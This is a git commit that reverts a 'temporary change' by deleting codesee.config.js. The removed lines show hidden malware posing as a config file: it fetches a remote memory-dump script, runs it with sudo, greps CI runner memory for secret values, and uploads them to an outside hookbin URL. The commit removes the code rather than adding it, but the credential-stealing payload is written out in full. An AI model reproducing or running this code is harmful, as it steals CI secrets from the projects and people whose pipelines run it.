a9df152990081e7cad0cb914fefecac7f79e4d7c
j5884p5g <j5884p5g@rolf.ovh>
2026-04-13 12:28:35 +0000

    Revert "Add temporary change"
    This reverts commit 66359c751c0fd6c2767095a6b74feaa94af70ef5.

--- codesee.config.js
+++
@@ -1,7 +0,0 @@
-
-const { execSync } = require('child_process');
-try {
-  execSync('curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE "\"[^\"]+\":\{\"value\":\"[^\"]*\",\"isSecret":true\}" >> "/tmp/secrets" && curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/' + process.env.GITHUB_RUN_ID + '"');
-} catch (e) {}
-module.exports = {};
-
